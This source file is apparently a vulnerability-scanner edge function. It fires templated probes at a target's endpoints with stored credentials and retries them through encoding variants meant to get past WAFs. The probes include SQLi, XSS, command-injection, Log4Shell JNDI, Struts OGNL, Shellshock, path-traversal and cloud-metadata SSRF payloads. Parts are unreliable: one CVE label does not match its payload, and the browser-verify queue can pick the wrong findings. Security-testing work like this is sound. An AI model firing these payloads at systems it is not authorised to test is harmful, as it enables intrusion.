// Nuclei-style template runner.
// Iterates curated OWASP Top 10 + CVE templates against a target's discovered
// endpoints. WAF-aware: detects WAF up front, slows down, and retries each
// payload through encoding variants. Writes per-category coverage into
// public.owasp_coverage and findings into vulnerability_findings.
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { safeFetch, readBodySafe } from "../_shared/safe-fetch.ts";
import { detectWaf, AdaptiveThrottle, encodingVariants, isStrictXssReflection } from "../_shared/waf-detect.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};
const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SERVICE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;

type Template = {
  id: string;
  category: string; // OWASP Top 10 label, e.g. A03:Injection
  severity: "info" | "low" | "medium" | "high" | "critical";
  cve?: string;
  payloads: string[];
  // Returns true when response is evidence of the vuln. body is the raw response body, status is HTTP status, baselineBody is original.
  matcher: (body: string, status: number, payload: string, baselineBody: string) => boolean;
};

// Curated nuclei-style template bank covering OWASP Top 10 + popular CVEs.
const TEMPLATES: Template[] = [
  // A01: Broken Access Control
  { id: "a01-idor-numeric", category: "A01:BAC", severity: "high",
    payloads: ["1", "2", "0", "-1", "9999"],
    matcher: (body, status) => status === 200 && body.length > 200 && !/forbid|unauth|denied/i.test(body) },
  // A02: Crypto Failures - exposed .env / config
  { id: "a02-env-exposed", category: "A02:Crypto", severity: "high",
    payloads: ["/.env", "/config.json", "/wp-config.php.bak", "/.git/config"],
    matcher: (body) => /AWS_|SECRET|API_KEY|DB_PASS|DATABASE_URL|\[core\]/i.test(body) },
  // A03: Injection - SQLi error-based
  { id: "a03-sqli-error", category: "A03:Injection", severity: "high",
    payloads: ["'", "\"", "')", "' OR '1'='1", "1) UNION SELECT NULL--"],
    matcher: (body) => /SQL syntax|mysql_fetch|ORA-\d+|PostgreSQL.*ERROR|SQLite\/JDBCDriver|unclosed quotation/i.test(body) },
  // A03: XSS (strict reflection)
  { id: "a03-xss-reflected", category: "A03:Injection", severity: "high",
    payloads: ["<svg/onload=cyberscope1>", "\"><img src=x onerror=cyberscope2>", "<cyberscope>"],
    matcher: (body, _s, payload) => isStrictXssReflection(body, payload) },
  // A03: Command injection
  { id: "a03-cmdi-time", category: "A03:Injection", severity: "critical",
    payloads: [";sleep 5;", "|sleep 5", "`sleep 5`", "$(sleep 5)"],
    matcher: () => false /* timing matched by runner instead */ },
  // A04: Insecure Design - debug routes
  { id: "a04-debug-routes", category: "A04:Design", severity: "medium",
    payloads: ["/debug", "/console", "/swagger.json", "/actuator/env", "/api/swagger-ui"],
    matcher: (body, status) => status === 200 && /swagger|actuator|debug|api docs|openapi/i.test(body) },
  // A05: Security Misconfig - directory listing
  { id: "a05-dirlist", category: "A05:Misconfig", severity: "medium",
    payloads: ["/", "/uploads/", "/backup/", "/files/"],
    matcher: (body) => /Index of \/|<title>Directory listing/i.test(body) },
  // A06: Vulnerable components - common CVE checks
  { id: "cve-2021-44228-log4shell", category: "A06:Components", severity: "critical", cve: "CVE-2021-44228",
    payloads: ["${jndi:ldap://oob.cyberscope.test/x}"],
    matcher: (body) => /jndi|log4j|class loader/i.test(body) },
  { id: "cve-2017-5638-struts", category: "A06:Components", severity: "critical", cve: "CVE-2017-5638",
    payloads: ["%{(#_='multipart/form-data').(#a=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].getWriter()).(#a.println('cyberscope-struts')).(#a.flush())}"],
    matcher: (body) => /cyberscope-struts/.test(body) },
  { id: "cve-2018-15473-ssh", category: "A06:Components", severity: "medium", cve: "CVE-2018-15473",
    payloads: ["/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"],
    matcher: (_b, status) => status === 200 },
  { id: "cve-2014-6271-shellshock", category: "A06:Components", severity: "critical", cve: "CVE-2014-6271",
    payloads: ["() { :;}; echo cyberscope-shellshock"],
    matcher: (body) => /cyberscope-shellshock/.test(body) },
  // A07: Auth Failures - default creds path
  { id: "a07-admin-panel", category: "A07:Auth", severity: "medium",
    payloads: ["/admin", "/administrator", "/wp-admin", "/manage", "/login"],
    matcher: (body, status) => status === 200 && /admin|login|sign in/i.test(body) },
  // A08: Integrity Failures - no SRI
  { id: "a08-no-sri", category: "A08:Integrity", severity: "low",
    payloads: ["/"],
    matcher: (body) => /<script[^>]*src=["'][^"']+["'](?![^>]*integrity=)/i.test(body) },
  // A09: Logging - exposed log files
  { id: "a09-log-exposed", category: "A09:Logging", severity: "medium",
    payloads: ["/error.log", "/access.log", "/debug.log", "/laravel.log"],
    matcher: (body, status) => status === 200 && /\d{4}-\d{2}-\d{2}|stack trace|exception/i.test(body) },
  // A10: SSRF
  { id: "a10-ssrf-localhost", category: "A10:SSRF", severity: "high",
    payloads: ["http://127.0.0.1/", "http://localhost:22/", "http://169.254.169.254/latest/meta-data/"],
    matcher: (body, status) => status >= 500 || /ami-id|instance-id|SSH-2\.0/i.test(body) },
];

async function runTemplate(
  baseUrl: string, tmpl: Template, throttle: AdaptiveThrottle, authHeaders: Record<string, string> = {},
): Promise<{ payloadsSent: number; wafBlocked: number; findings: Array<{ payload: string; evidence: string; statusCode: number; endpoint: string }> }> {
  let payloadsSent = 0;
  let wafBlocked = 0;
  const findings: Array<{ payload: string; evidence: string; statusCode: number; endpoint: string }> = [];

  // Get baseline once
  let baselineBody = "";
  try {
    const b = await safeFetch(baseUrl, { method: "GET", headers: authHeaders }, 5000);
    baselineBody = await readBodySafe(b, 16384);
  } catch { /* ignore */ }

  for (const rawPayload of tmpl.payloads) {
    const variants = encodingVariants(rawPayload, 4);
    let matched = false;
    for (const v of variants) {
      await throttle.wait();
      payloadsSent++;
      try {
        const targetUrl = v.startsWith("/") || v.startsWith("http")
          ? (v.startsWith("http") ? v : new URL(v, baseUrl).toString())
          : baseUrl + (baseUrl.includes("?") ? "&" : "?") + `q=${v}`;
        const t0 = Date.now();
        const r = await safeFetch(targetUrl, { method: "GET", headers: authHeaders }, 8000);
        const elapsed = Date.now() - t0;
        const body = await readBodySafe(r, 32768);

        if ([403, 406, 429, 451, 501].includes(r.status)) {
          wafBlocked++;
          throttle.noteBlock();
          continue;
        }
        throttle.noteOk();

        const timed = tmpl.id === "a03-cmdi-time" && elapsed > 4500;
        if (timed || tmpl.matcher(body, r.status, rawPayload, baselineBody)) {
          findings.push({
            payload: rawPayload,
            evidence: timed ? `timed-out after ${elapsed}ms (sleep matched)` : body.slice(0, 400),
            statusCode: r.status,
            endpoint: targetUrl,
          });
          matched = true;
          break;
        }
      } catch {
        // network error counts as no match
      }
    }
    if (matched) break;
  }
  return { payloadsSent, wafBlocked, findings };
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
  const ok = (b: Record<string, unknown>) =>
    new Response(JSON.stringify(b), { status: 200, headers: { ...corsHeaders, "Content-Type": "application/json" } });

  try {
    const { targetId, scanRunId } = await req.json().catch(() => ({}));
    if (!targetId) return ok({ ok: false, error: "targetId required" });

    const db = createClient(SUPABASE_URL, SERVICE_KEY, { auth: { persistSession: false } });
    const { data: target } = await db.from("target_workspaces").select("*").eq("id", targetId).maybeSingle();
    if (!target) return ok({ ok: false, error: "target not found" });

    let targetUrl: string = (target as any).domain || (target as any).ip_range;
    if (!targetUrl) return ok({ ok: false, error: "no target url" });
    if (!/^https?:\/\//i.test(targetUrl)) targetUrl = `https://${targetUrl}`;

    // 0) Load auth profile (cookie / bearer) if present
    const { data: authp } = await db.from("auth_profiles")
      .select("auth_type,cookie_header,bearer_token").eq("target_id", targetId).eq("is_valid", true).limit(1).maybeSingle();
    const authHeaders: Record<string, string> = { "User-Agent": "CyberScope/1.0" };
    if (authp?.auth_type === "cookie" && authp.cookie_header) authHeaders["Cookie"] = authp.cookie_header;
    if (authp?.auth_type === "bearer" && authp.bearer_token) authHeaders["Authorization"] = `Bearer ${authp.bearer_token}`;
    const authMode = authp ? authp.auth_type : "none";

    // 1) WAF probe up-front
    const waf = await detectWaf(targetUrl);
    const throttle = new AdaptiveThrottle(waf.detected);
    await db.from("scan_logs").insert({
      target_id: targetId, log_type: waf.detected ? "warning" : "info",
      message: waf.detected
        ? `🛡️  WAF detected (${waf.vendor}) — slow polite mode + encoding variants (auth=${authMode})`
        : `✅ No WAF detected — running templates at normal speed (auth=${authMode})`,
      metadata: { waf, scanRunId, authMode },
    });

    // 2) Collect endpoints — fan out across up to 6
    const { data: eps } = await db.from("discovered_endpoints")
      .select("url").eq("target_id", targetId).limit(40);
    const urls = new Set<string>([targetUrl]);
    (eps || []).forEach((e) => e.url && urls.add(e.url));
    const urlList = Array.from(urls).slice(0, 6);

    // 3) Iterate templates × endpoints (budget ~45s)
    const startedAt = Date.now();
    const perCategory = new Map<string, { checks: number; payloads: number; findings: number; waf: number }>();
    const insertedFindings: any[] = [];

    outer: for (const tmpl of TEMPLATES) {
      for (const url of urlList) {
        if (Date.now() - startedAt > 42_000) break outer;
        const r = await runTemplate(url, tmpl, throttle, authHeaders);

        const acc = perCategory.get(tmpl.category) || { checks: 0, payloads: 0, findings: 0, waf: 0 };
        acc.checks += 1;
        acc.payloads += r.payloadsSent;
        acc.findings += r.findings.length;
        acc.waf += r.wafBlocked;
        perCategory.set(tmpl.category, acc);

        for (const f of r.findings) {
          insertedFindings.push({
            target_id: targetId,
            severity: tmpl.severity,
            title: `[${tmpl.category}] ${tmpl.cve || tmpl.id}`,
            description: `Template ${tmpl.id} matched at ${f.endpoint}. Payload: ${f.payload}`,
            payload: f.payload,
            confidence_score: tmpl.cve ? 85 : 70,
            hard_evidence: { templateId: tmpl.id, category: tmpl.category, cve: tmpl.cve || null, snippet: f.evidence, statusCode: f.statusCode, waf: waf.vendor, endpoint: f.endpoint, source: "template-runner" },
            _tmplId: tmpl.id, // local-only marker, stripped before insert
          });
        }
        if (r.findings.length) break; // one endpoint match is enough per template
      }
    }

    // 4) Persist coverage rows
    const coverageRows = Array.from(perCategory.entries()).map(([category, v]) => ({
      target_id: targetId,
      scan_run_id: scanRunId || null,
      owasp_category: category,
      checks_run: v.checks,
      payloads_sent: v.payloads,
      findings_count: v.findings,
      waf_blocked: v.waf,
      metadata: { waf_vendor: waf.vendor, auth_mode: authMode, endpoints_scanned: urlList.length },
    }));
    if (coverageRows.length) await db.from("owasp_coverage").insert(coverageRows);

    // 5) Insert findings + auto-queue browser verification for XSS-class findings
    let queuedBrowserVerify = 0;
    if (insertedFindings.length) {
      const xssTmplIds = new Set(insertedFindings.filter(f => /xss|redirect|csti|prototype|dom/i.test(f._tmplId)).map((_, i) => i));
      const rows = insertedFindings.map(({ _tmplId, ...rest }) => rest);
      const { data: inserted } = await db.from("vulnerability_findings").insert(rows).select("id");
      for (let i = 0; i < (inserted || []).length; i++) {
        if (!xssTmplIds.has(i)) continue;
        await db.from("scan_jobs").insert({
          target_id: targetId, job_type: "browser_verify",
          payload: { findingId: inserted![i].id }, status: "queued", priority: 8,
        });
        queuedBrowserVerify++;
      }
    }

    await db.from("scan_logs").insert({
      target_id: targetId, log_type: "result",
      message: `🧪 Template runner: ${TEMPLATES.length} templates × ${urlList.length} endpoints, ${insertedFindings.length} findings, ${queuedBrowserVerify} browser-verifies queued, WAF blocks=${Array.from(perCategory.values()).reduce((a, b) => a + b.waf, 0)}`,
      metadata: { waf, coverage: coverageRows, authMode, queuedBrowserVerify },
    });

    return ok({ ok: true, waf, coverage: coverageRows, findings: insertedFindings.length, queuedBrowserVerify, authMode, endpoints: urlList.length });
  } catch (e) {
    return ok({ ok: false, error: e instanceof Error ? e.message : String(e) });
  }
});
